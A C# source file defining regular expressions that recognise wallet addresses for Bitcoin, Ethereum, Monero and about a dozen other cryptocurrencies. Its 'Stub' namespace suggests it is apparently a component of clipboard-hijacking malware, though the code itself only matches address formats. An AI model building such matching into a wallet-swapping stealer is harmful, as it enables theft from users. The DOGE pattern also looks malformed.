using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stub.Help
{
    class RegexPatterns
    {
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(@"(?:^[13][a-zA-HJ-NP-Z0-9]{26,35}$)")}, // Bitcoin 1/3
            {"bc1", new Regex(@"(?:^bc1[a-zA-HJ-NP-Z0-9]{35,41}$)") }, // Bitcoin bc1
            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") }, // Ethereum
            {"xmr", new Regex(@"(?:^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
            {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
            {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
            {"ltc", new Regex(@"(?:^[LM][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
            {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") }, // Neocoin
            {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") }, // Bitcoin Cash
            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") }, // Dashcoin
            {"doge", new Regex(@"(?:^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$)")  }, // DOGE Coin
            {"trx", new Regex(@"(?:^T[a-zA-Z0-9]{28,33}$)")  }, // Tron
            {"zcash", new Regex(@"(?:^t1[0-9A-z]{33}$)")  }, // Z-Cash
            {"bnb", new Regex(@"(?:^bnb[a-z0-9]{39}$)")  }, // Binance Coin
            {"ton", new Regex(@"^[a-zA-Z0-9-_]{48}$")  } // TON Coin
            //^(0|-1):[a-f0-9]{64}$ or ^(0|-1):([a-f0-9]{64}|[A-F0-9]{64})$
        };

    }
}
